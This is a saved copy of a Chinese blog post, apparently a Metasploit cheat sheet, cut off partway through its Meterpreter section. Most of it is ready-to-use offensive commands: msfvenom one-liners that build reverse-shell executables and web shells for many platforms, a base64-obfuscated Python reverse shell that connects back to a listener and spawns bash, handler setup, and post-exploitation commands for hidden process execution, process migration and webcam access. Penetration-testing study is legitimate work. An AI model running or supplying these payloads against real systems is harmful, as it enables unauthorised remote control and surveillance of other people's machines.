@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<!-- saved from url=(0051)https://saucer-man.com/information_security/79.html -->
+<html lang="zh" data-redeviation-bs-uid="75fifl2zyx8"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="HandheldFriendly" content="True">
+<meta name="viewport" content="initial-scale=1,width=device-width,minimum-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="wap-font-scale" content="no">
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta name="description" itemprop="description" content="信息安全">
+<meta name="keywords" content="saucerman">
+<meta property="og:type" content="blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://saucer-man.com/logo.gif">
+<meta property="og:site_name" content="SAUCERMAN">
+<meta property="og:url" content="https://saucer-man.com/information_security/79.html">
+<meta property="og:title" content="msf备忘录 - SAUCERMAN">
+<meta property="og:author" content="saucerman">
+<meta property="og:description" content="1. 安装运行及初始化安装# 安装curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/t...">
+<meta property="og:release_date" content="2019-06-12">
+<meta name="description" content="1. 安装运行及初始化安装# 安装curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/t...">
+<script src="https://hm.baidu.com/hm.js?5c0e82a5d2d3071ba3f2084e34c41714"></script><script type="text/javascript">(function () {var event =document.addEventListener ?{add:'addEventListener',triggers:['scroll','mousemove','keyup','touchstart'],load:'DOMContentLoaded'
+} :{add:'attachEvent',triggers:['onfocus','onmousemove','onkeyup','ontouchstart'],load:'onload'
+},added =false;document[event.add](event.load,function () {var r =document.getElementById('respond-post-79'),input =document.createElement('input');input.type ='hidden';input.name ='_';input.value =(function () {var _858 ='0'
++'dWc'
++
+'M'+
+'59'+'65e'
++''+
+'6'+'8'
++
+'937'+
+'9b'+'8df'
++'b3'
++
+'f'+'285'
++
+'3b'+'c0d'
++'79'
++
+'c8c',_9iw =[[1,4],[1,2]];for (var i =0;i < _9iw.length;i ++) {_858 =_858.substring(0,_9iw[i][0]) + _858.substring(_9iw[i][1]);}
+return _858;})();if (null !=r) {var forms =r.getElementsByTagName('form');if (forms.length >0) {function append() {if (!added) {forms[0].appendChild(input);added =true;}
+}
+for (var i =0;i < event.triggers.length;i ++) {var trigger =event.triggers[i];document[event.add](trigger,append);window[event.add](trigger,append);}
+}
+}
+});})();</script> <title>msf备忘录 - SAUCERMAN</title>
+<link rel="shortcut icon" href="https://saucer-man.com/favicon.ico"> <link rel="manifest" href="https://saucer-man.com/usr/themes/cactus/manifest.json">
+<link rel="stylesheet" href="./msf备忘录 - SAUCERMAN_files/style.css">
+<script src="./msf备忘录 - SAUCERMAN_files/jquery.min.js"></script>
+<script>document.addEventListener("error",function(e) {var elem =e.target;if (elem.tagName.toLowerCase() =='img') {elem.style.display ='none'
+}
+},true);</script>
+<script>var _hmt =_hmt ||[];(function() {var hm =document.createElement("script");hm.src ="https://hm.baidu.com/hm.js?5c0e82a5d2d3071ba3f2084e34c41714";var s =document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s);})();</script>
+<style class="redeviation-bs-style" data-name="content">/*! (c) Philipp Koenig under GPL-3.0 */
+body>div#redeviation-bs-indicator>div{opacity:0;pointer-events:none}body>#redeviation-bs-overlay.redeviation-bs-visible,body>#redeviation-bs-sidebar.redeviation-bs-visible{opacity:1;pointer-events:auto}body.redeviation-bs-noscroll{overflow:hidden !important}body>div#redeviation-bs-indicator>div{position:absolute;transform:translate3d(-40px, 0, 0);top:0;left:0;width:40px !important;height:100%;background:rgba(0,0,0,0.5);border-radius:0 10px 10px 0;transition:opacity .3s,transform .3s;z-index:2}body>div#redeviation-bs-indicator>div>span{-webkit-mask:no-repeat center/32px;-webkit-mask-image:url(chrome-extension://jdbnofccmhefkmjbkkdkfiicjkgofkdh/img/icon-bookmark.svg);background-color:#ffffff;position:absolute;display:block;top:0;left:0;width:100%;height:100%}body>div#redeviation-bs-indicator[data-pos=right]{left:auto;right:0}body>div#redeviation-bs-indicator[data-pos=right]>div{transform:translate3d(40px, 0, 0);left:auto;right:0;border-radius:10px 0 0 10px}body>div#redeviation-bs-indicator.redeviation-bs-fullHeight>div{border-radius:0}body>div#redeviation-bs-indicator.redeviation-bs-hover>div{transform:translate3d(0, 0, 0);opacity:1}body>div#redeviation-bs-indicator[data-pos=left].redeviation-bs-has-lsb{height:100% !important;top:0 !important}body>div#redeviation-bs-indicator[data-pos=left].redeviation-bs-has-lsb>div{background:rgba(0,0,0,0)}body>div#redeviation-bs-indicator[data-pos=left].redeviation-bs-has-lsb>div>span{-webkit-mask-position-y:20px}body>#redeviation-bs-sidebar{width:350px;max-width:none;height:0;z-index:2147483646;background-color:rgba(255,255,255,0.8) !important;color-scheme:auto !important;speak:none;border:none;display:block !important;transform:translate3d(-350px, 0, 0);transition:width 0s .3s,height 0s .3s,opacity .3s,transform .3s}body>#redeviation-bs-sidebar[data-pos=right]{left:auto;right:0;transform:translate3d(350px, 0, 0)}body>#redeviation-bs-sidebar.redeviation-bs-visible{width:calc(100% + 350px);height:100%;transform:translate3d(0, 0, 0);transition:opacity .3s,transform .3s}body>#redeviation-bs-sidebar.sidepanel{width:100% !important}body>#redeviation-bs-sidebar.redeviation-bs-hideMask{background:none !important}body>#redeviation-bs-sidebar.redeviation-bs-hideMask:not(.redeviation-bs-hover){width:calc(350px + 50px)}body>#redeviation-bs-overlay{width:100%;max-width:none;height:100%;z-index:2147483647;border:none;speak:none;background:rgba(0,0,0,0.5) !important;color-scheme:auto !important;transition:opacity .3s}</style></head>
+<body>
+<div id="header-post" style="width:13%">
+<a id="menu-icon" href="https://saucer-man.com/information_security/79.html#">
+<i class="fa fa-bars fa-lg"></i>
+</a>
+<a id="menu-icon-tablet" href="https://saucer-man.com/information_security/79.html#">
+<i class="fa fa-bars fa-lg"></i>
+</a>
+<a id="top-icon-tablet" href="https://saucer-man.com/information_security/79.html#" onclick="$(&#39;html, body&#39;).animate({ scrollTop: 0 }, &#39;fast&#39;);" style="display:none;">
+<i class="fa fa-chevron-up fa-lg"></i>
+</a>
+<span id="menu">
+<span id="nav" style="display: block;">
+<ul>
+<li>
+<a href="https://saucer-man.com/">Home</a>
+</li>
+<li><a href="https://saucer-man.com/archives.html">Archives</a></li><li><a href="https://saucer-man.com/about.html">About</a></li> <li>
+<a href="https://github.com/saucer-man" target="_blank">Github</a>
+</li> </ul>
+</span>
+<br>
+<span id="actions">
+<ul>
+<li>
+<a class="icon" href="https://saucer-man.com/information_security/248.html" title="谈谈php一句话木马的免杀"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$(&quot;#i-prev&quot;).toggle();" onmouseout="$(&quot;#i-prev&quot;).toggle();"></i></a> </li>
+<li>
+<a class="icon" href="https://saucer-man.com/information_security/233.html" title="实现交互式shell的几种方式"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$(&quot;#i-next&quot;).toggle();" onmouseout="$(&quot;#i-next&quot;).toggle();"></i></a> </li>
+<li>
+<a class="icon" href="https://saucer-man.com/information_security/79.html#" onclick="$(&#39;html, body&#39;).animate({ scrollTop: 0 }, &#39;fast&#39;);">
+<i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$(&quot;#i-top&quot;).toggle();" onmouseout="$(&quot;#i-top&quot;).toggle();"></i>
+</a>
+</li>
+<li>
+<a class="icon" href="https://saucer-man.com/information_security/79.html#">
+<i class="fa fa-share-alt" aria-hidden="true" onmouseover="$(&quot;#i-share&quot;).toggle();" onmouseout="$(&quot;#i-share&quot;).toggle();" onclick="$(&quot;#share&quot;).toggle();return false;"></i>
+</a>
+</li>
+</ul>
+<span id="i-prev" class="info" style="display:none;">Previous post</span>
+<span id="i-next" class="info" style="display:none;">Next post</span>
+<span id="i-top" class="info" style="display:none;">Back to top</span>
+<span id="i-share" class="info" style="display:none;">Share post</span>
+</span>
+<br>
+<div id="share" style="display: none">
+<ul>
+<li>
+<a class="icon" href="http://v.t.sina.com.cn/share/share.php?u=https://saucer-man.com/information_security/79.html&amp;text=msf%E5%A4%87%E5%BF%98%E5%BD%95">
+<i class="fa fa-weibo" aria-hidden="true"></i>
+</a>
+</li>
+<li>
+<a class="icon" href="http://www.facebook.com/sharer.php?u=https://saucer-man.com/information_security/79.html">
+<i class="fa fa-facebook" aria-hidden="true"></i>
+</a>
+</li>
+<li>
+<a class="icon" href="https://twitter.com/share?url=https://saucer-man.com/information_security/79.html&amp;text=msf%E5%A4%87%E5%BF%98%E5%BD%95">
+<i class="fa fa-twitter" aria-hidden="true"></i>
+</a>
+</li>
+<li>
+<a class="icon" href="http://www.linkedin.com/shareArticle?url=https://saucer-man.com/information_security/79.html&amp;title=msf%E5%A4%87%E5%BF%98%E5%BD%95">
+<i class="fa fa-linkedin" aria-hidden="true"></i>
+</a>
+</li>
+<li>
+<a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://saucer-man.com/information_security/79.html&amp;is_video=false&amp;description=msf%E5%A4%87%E5%BF%98%E5%BD%95">
+<i class="fa fa-pinterest" aria-hidden="true"></i>
+</a>
+</li>
+<li>
+<a class="icon" href="mailto:?subject=msf%E5%A4%87%E5%BF%98%E5%BD%95&amp;body=Check%20out%20this%20article:%20https://saucer-man.com/information_security/79.html">
+<i class="fa fa-envelope" aria-hidden="true"></i>
+</a>
+</li>
+<li>
+<a class="icon" href="https://getpocket.com/save?url=https://saucer-man.com/information_security/79.html&amp;title=msf%E5%A4%87%E5%BF%98%E5%BD%95">
+<i class="fa fa-get-pocket" aria-hidden="true"></i>
+</a>
+</li>
+<li>
+<a class="icon" href="http://reddit.com/submit?url=https://saucer-man.com/information_security/79.html&amp;title=msf%E5%A4%87%E5%BF%98%E5%BD%95">
+<i class="fa fa-reddit" aria-hidden="true"></i>
+</a>
+</li>
+<li>
+<a class="icon" href="http://www.stumbleupon.com/submit?url=https://saucer-man.com/information_security/79.html&amp;title=msf%E5%A4%87%E5%BF%98%E5%BD%95">
+<i class="fa fa-stumbleupon" aria-hidden="true"></i>
+</a>
+</li>
+<li>
+<a class="icon" href="http://digg.com/submit?url=https://saucer-man.com/information_security/79.html&amp;title=msf%E5%A4%87%E5%BF%98%E5%BD%95">
+<i class="fa fa-digg" aria-hidden="true"></i>
+</a>
+</li>
+</ul>
+</div>
+<div id="toc">
+<nav id="TableOfContents">
+<ul id="TableOfContentsUl" style="height: 500px; overflow:auto;}">
+<li><a href="https://saucer-man.com/information_security/79.html#cl-1">&nbsp;&nbsp;1. 安装运行及初始化</a></li><li><a href="https://saucer-man.com/information_security/79.html#cl-2">&nbsp;&nbsp;2. msf基本命令</a></li><li><a href="https://saucer-man.com/information_security/79.html#cl-3">&nbsp;&nbsp;3 msfvenom生成payload</a></li><li><a href="https://saucer-man.com/information_security/79.html#cl-4">&nbsp;&nbsp;4. Meterpreter基本命令</a></li><li><a href="https://saucer-man.com/information_security/79.html#cl-5">&nbsp;&nbsp;&nbsp;&nbsp;4.1 基本系统命令</a></li><li><a href="https://saucer-man.com/information_security/79.html#cl-6">&nbsp;&nbsp;&nbsp;&nbsp;4.2 文件系统命令</a></li><li><a href="https://saucer-man.com/information_security/79.html#cl-7">&nbsp;&nbsp;&nbsp;&nbsp;4.3 网络命令</a></li><li><a href="https://saucer-man.com/information_security/79.html#cl-8">&nbsp;&nbsp;&nbsp;&nbsp;4.4 信息收集</a></li><li><a href="https://saucer-man.com/information_security/79.html#cl-9">&nbsp;&nbsp;&nbsp;&nbsp;4.5 提权</a></li><li><a href="https://saucer-man.com/information_security/79.html#cl-10">&nbsp;&nbsp;&nbsp;&nbsp;4.6 获取凭证</a></li><li><a href="https://saucer-man.com/information_security/79.html#cl-11">&nbsp;&nbsp;&nbsp;&nbsp;4.7 假冒令牌</a></li><li><a href="https://saucer-man.com/information_security/79.html#cl-12">&nbsp;&nbsp;&nbsp;&nbsp;4.8 植入后门</a></li><li><a href="https://saucer-man.com/information_security/79.html#cl-13">&nbsp;&nbsp;参考</a></li> </ul>
+</nav>
+</div>
+</span>
+</div>
+<ul class="widget-list" id="AnchorContent"> </ul>
+<div class="content index width mx-auto px3 my3">
+<section id="wrapper" class="home">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">msf备忘录</h1>
+<div class="meta">
+<div class="postdate">
+<time datetime="2019-06-12" itemprop="datePublished">2019-06-12</time>
+</div>
+<div class="article-tag">
+<i class="fa fa-eye"></i>
+<span>
+<span>8710</span>
+</span>
+</div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a href="https://saucer-man.com/category/information_security/">信息安全</a> </div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a href="https://saucer-man.com/tag/metasploit/">metasploit</a> </div>
+<div class="article-tag-box"></div>
+</div>
+</header>
+<div class="content" itemprop="articleBody" id="post-content">
+<blockquote><p>文章最后更新时间为：2021年03月12日 17:22:09</p></blockquote>
+<h2><a name="cl-1"></a>1. 安装运行及初始化</h2><p>安装</p><pre style="position: relative;"><code class="lang-bash hljs"><span class="hljs-comment"># 安装</span>
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall
+
+<span class="hljs-comment"># 安装完成后位置</span>
+<span class="hljs-comment"># /opt/metasploit-framework/embedded/framework/</span>
+
+<span class="hljs-comment"># 目录结构 </span>
+--modules 重点看这里就行了
+  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)
+  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统
+  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块
+  --nops 绕过针对溢出攻击滑行字符串的拦截检测
+  --payloads 攻击荷载，主要在目标机器执行代码
+  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取<span class="hljs-built_in">hash</span>等
+  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能
+--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件
+--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件
+--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此
+--tools 包含一些有用的脚本和零散的工具</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: visible;">复制</div></pre><p>启动</p><pre style="position: relative;"><code class="hljs ruby"><span class="hljs-comment"># 运行</span>
+$ msfconsole
+<span class="hljs-comment"># 初始化数据库</span>
+$ msfdb init
+<span class="hljs-comment"># 重建缓存</span>
+$ db_rebuild_cache
+<span class="hljs-comment"># 查看数据库连接情况</span>
+$ db_status</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><h2><a name="cl-2"></a>2. msf基本命令</h2><pre style="position: relative;"><code class="lang-bash hljs">show exploits – 查看所有可用的渗透攻击程序代码 
+show auxiliary – 查看所有可用的辅助攻击工具 
+show options – 查看该模块所有可用选项 
+show payloads – 查看该模块适用的所有载荷代码 
+show targets – 查看该模块适用的攻击目标类型
+search – 根据关键字搜索某模块 
+info – 显示某模块的详细信息 
+use – 进入使用某渗透攻击模块 
+back – 回退 
+<span class="hljs-built_in">set</span>/<span class="hljs-built_in">unset</span> – 设置/禁用模块中的某个参数 
+setg/unsetg – 设置/禁用适用于所有模块的全局参数 
+save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><h2><a name="cl-3"></a>3 msfvenom生成payload</h2><pre style="position: relative;"><code class="lang-bash hljs">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)
+-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all
+-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度
+-f, --format     &lt;format&gt;        指定输出格式 (使用 --<span class="hljs-built_in">help</span>-formats 来获取msf支持的输出格式列表)
+-e, --encoder    [encoder]       指定需要使用的encoder（编码器）
+-a, --arch       &lt;architecture&gt;  指定payload的目标架构
+    --platform   &lt;platform&gt;      指定payload的目标平台
+-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度
+-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;<span class="hljs-comment">#039;\x00\xff&amp;#039;</span>
+-i, --iterations &lt;count&gt;         指定payload的编码次数
+-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件
+-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板
+-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
+    --payload-options            列举payload的标准选项
+-o, --out   &lt;path&gt;               保存payload
+-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式
+    --shellest                   最小化生成payload
+-h, --<span class="hljs-built_in">help</span>                       查看帮助选项
+    --<span class="hljs-built_in">help</span>-formats               查看msf支持的输出格式列表</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>1.可执行程序</p><p>Linux</p><pre style="position: relative;"><code class="lang-bash hljs">反向连接：
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf
+正向连接：
+msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>Windows</p><pre style="position: relative;"><code class="lang-bash hljs">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>Mac</p><pre style="position: relative;"><code class="lang-bash hljs">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>执行方式：直接复制可执行程序到目标机器上执行就行了。</p><p>2.Web Payloads</p><p>PHP</p><pre style="position: relative;"><code class="lang-bash hljs">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php
+cat shell.php | pbcopy &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;?php '</span> | tr -d <span class="hljs-string">'\n'</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>ASP</p><pre style="position: relative;"><code class="lang-bash hljs">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>JSP</p><pre style="position: relative;"><code class="lang-bash hljs">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>WAR</p><pre style="position: relative;"><code class="lang-bash hljs">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p><pre style="position: relative;"><code class="lang-bash hljs">php shell.php</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>3.脚本shell</p><p>Python</p><pre style="position: relative;"><code class="lang-bash hljs">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>Bash</p><pre style="position: relative;"><code class="lang-bash hljs">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>Perl</p><pre style="position: relative;"><code class="lang-bash hljs">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>执行方式：复制shell.py中的内容在linux命令行下执行：</p><pre style="position: relative;"><code class="hljs nginx"><span class="hljs-attribute">python</span> -c <span class="hljs-string">"exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"</span></code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>4.shellcode<br>Linux Based Shellcode</p><pre style="position: relative;"><code class="lang-bash hljs">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>Windows Based Shellcode</p><pre style="position: relative;"><code class="lang-bash hljs">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>Mac Based Shellcode</p><pre style="position: relative;"><code class="lang-bash hljs">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><h2><a name="cl-4"></a>4. Meterpreter基本命令</h2><p>首先需要先获取meterpreter：</p><pre style="position: relative;"><code class="lang-bash hljs">use exploit/multi/handler
+<span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp
+<span class="hljs-built_in">set</span> LHOST 192.168.81.160
+<span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span>
+exploit -j -z <span class="hljs-comment"># -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span>
+<span class="hljs-built_in">jobs</span>  <span class="hljs-comment"># 查看后台攻击任务 </span>
+<span class="hljs-built_in">kill</span> &lt;id&gt;  <span class="hljs-comment"># 停止某后台攻击任务 </span>
+sessions -l  <span class="hljs-comment"># (查看会话)</span>
+sessions -i 2   <span class="hljs-comment"># 选择会话</span>
+sessions -k 2   <span class="hljs-comment"># 结束会话</span></code><div style="position: absolute; right: 4px; top: 4px; background-color: white; padding: 2px 8px; margin: 8px; border-radius: 4px; cursor: pointer; box-shadow: rgba(0, 0, 0, 0.05) 0px 2px 4px, rgba(0, 0, 0, 0.05) 0px 2px 4px; visibility: hidden;">复制</div></pre><p>如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。</p><p>获取到了meterpreter，就可以进行后渗透了。</p><h3><a name="cl-5"></a>4.1 基本系统命令</h3><pre style="position: relative;"><code class="lang-bash hljs"><span class="hljs-comment"># 会话管理</span>
+background  <span class="hljs-comment">#将当前会话放置后台</span>
+sessions  <span class="hljs-comment"># 查看会话</span>
+sessions -i  <span class="hljs-comment"># 切换会话</span>
+quit  <span class="hljs-comment"># 关闭当前的会话，返回msf终端</span>
+
+<span class="hljs-comment"># 系统设置</span>
+sysinfo  <span class="hljs-comment"># 查看目标机系统信息</span>
+idletime  <span class="hljs-comment"># 查看目标机闲置时间</span>
+reboot/shutdown   <span class="hljs-comment"># 重启/关机</span>
+
+<span class="hljs-comment"># shell</span>
+shell  <span class="hljs-comment"># 获得控制台权限</span>
+irb  <span class="hljs-comment"># 进入ruby终端</span>
+
+<span class="hljs-comment"># 进程迁移</span>
+getpid    <span class="hljs-comment"># 获取当前进程的pid</span>
+ps   <span class="hljs-comment"># 查看当前活跃进程</span>
+migrate &lt;pid值&gt;    <span class="hljs-comment">#将Meterpreter会话移植到指定pid值进程中</span>
+<span class="hljs-built_in">kill</span> &lt;pid值&gt;   <span class="hljs-comment">#杀死进程</span>
+migrate &lt;pid值&gt;    <span class="hljs-comment">#将Meterpreter会话移植到指定pid值进程中</span>
+
+<span class="hljs-comment"># 执行文件</span>
+execute <span class="hljs-comment">#在目标机中执行文件</span>
+execute -H -i -f cmd.exe <span class="hljs-comment"># 创建新进程cmd.exe，-H不可见，-i交互</span>
+
+<span class="hljs-comment"># 摄像头命令</span>
+webcam_list  <span class="hljs-comment">#查看摄像头列表</span>
+webcam_chat  <span class="hljs-comment"># 查看摄像头接口</span>
